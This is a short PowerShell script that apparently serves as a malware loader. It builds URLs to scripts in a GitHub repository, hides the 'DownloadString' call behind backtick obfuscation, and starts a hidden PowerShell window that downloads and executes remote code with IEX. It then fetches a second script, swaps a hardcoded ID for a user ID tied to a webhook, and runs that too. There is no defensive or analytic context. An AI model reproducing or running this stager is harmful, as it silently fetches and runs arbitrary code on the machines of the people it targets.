$codeuser = ("https://raw.githubusercontent.com/43a1723/test/main/usertelegram/$userid/main.ps1")
$downloaduser = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$codeuser')"
Start-Process "powershell" -Argument "`$userid=$userid;IEX($downloaduser)" -WindowStyle Hidden

$powershell_url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1"

#replace YOUR_WEBHOOK_HERE with $webhook
$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "1255292055182114876", "$userid"

iex $content
